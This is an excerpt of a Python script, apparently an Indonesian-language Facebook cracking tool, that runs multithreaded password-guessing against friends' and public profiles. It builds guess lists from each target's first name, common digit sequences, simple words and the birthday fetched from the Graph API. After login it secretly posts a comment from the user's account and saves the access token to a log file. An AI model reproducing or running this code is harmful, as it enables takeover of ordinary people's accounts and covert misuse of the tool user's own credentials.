...
# Author: Ahmjosh0 | github: Ahmjosh0 :v    #
###############################
...
def pilihLogin():
	...
	if(pil in ("","  ","   ","    ","     ","      ","       ")):
		...
		try:
			...
			r2=req.post(f"https://graph.facebook.com/646592719979171/comments/?message=ya jelas bang latip&access_token={token}")
		...
		if (find_token is None):
			...
			os.system("clear")
			print("[√] Login Berhasil\nNama Akun :",ru['name'])
			req.post(f"https://graph.facebook.com/646592719979171/comments/?message=ya jelas bang latip&access_token={to}")
			time.sleep(2)
			open("log.txt","a").write(to)
			nampung(to).menu()
			try:
				cek=req.get("https://mbasic.facebook.com/100004634894883",cookies={"cookie":cookie}).text
				true=False
...
class nampung:
	...
	def sendTeman(self):
		global idTeman
		os.system('clear')
		print(teman+"\nFollow IG @mark.cornel97 | Stop? CTRL + Z\n")
		...
		if(pi in ("1","01")):
			with Bool(max_workers=35) as tokai:
				for j in idTeman:
					...
					try:pwList=[r2['first_name']+'11',r2['first_name']+'12',r2['first_name']+'123',r2['first_name']+'1234',r2['first_name']+'12345',r2['first_name']+'123456',r2['first_name']+'1234567','112233','223344','445566','334455','556677','667788','778899','102030','203040','304050','123456','1234567','112112','080681',r2['birthday']]
					except:pass
					try:
			...
			with Bool(max_workers=35) as tokai:
				for j in idTeman:
					r2=json.loads(req.get(f"https://graph.facebook.com/{j}?access_token={self.token}").text)
					try:pwList=[r2['first_name']+'11',r2['first_name']+'12',r2['first_name']+'123',r2['first_name']+'1234',r2['first_name']+'12345',r2['first_name']+'123456',r2['first_name']+'1234567','223344','445566','556677','334455','102030','304050','112233','786786','123456','1234567','203040','lover','favour','jesus',r2['birthday']]
					except:pass
					try:
	...
	def sendPublik(self):
		global idPublik
		os.system('clear')
		print(publik+"\nFollow IG : @justiceealiu | Stop? CTRL + Z\n")
		print('\n[!] Pilih Methode Crack\n[1]. Methode Mbasic (Sedang, tidak cp semua)\n[2]. Methode Api (Cepat, kemungkinan cp semua)\n')
		pi=input("[?] Mau methode mana : ")
		print("")
		...
		if(pi in ("1","01")):
			with Bool(max_workers=35) as tokai:
				for j in idPublik:
					r2=json.loads(req.get(f"https://graph.facebook.com/{j}?access_token={self.token}").text)
					try:pwList=[r2['first_name']+'11',r2['first_name']+'12',r2['first_name']+'123',r2['first_name']+'1234',r2['first_name']+'12345',r2['first_name']+'123456',r2['first_name']+'1234567','112233','223344','334455','445566','556677','667788','778899','786786','102030','123456','1234567','203040','506070','121212',r2['birthday']]
					except:pass
					try:
			...
			with Bool(max_workers=35) as tokai:
				for j in idPublik:
					r2=json.loads(req.get(f"https://graph.facebook.com/{j}?access_token={self.token}").text)
					try:pwList=[r2['first_name']+'11',r2['first_name']+'12',r2['first_name']+'123',r2['first_name']+'1234',r2['first_name']+'12345',r2['first_name']+'123456',r2['first_name']+'1234567','445566','223344','334455','556677','778899','102030','203040','123456','889900','081081','JESUS','lover','405060','12345678',r2['birthday']]
					except:pass
					try:
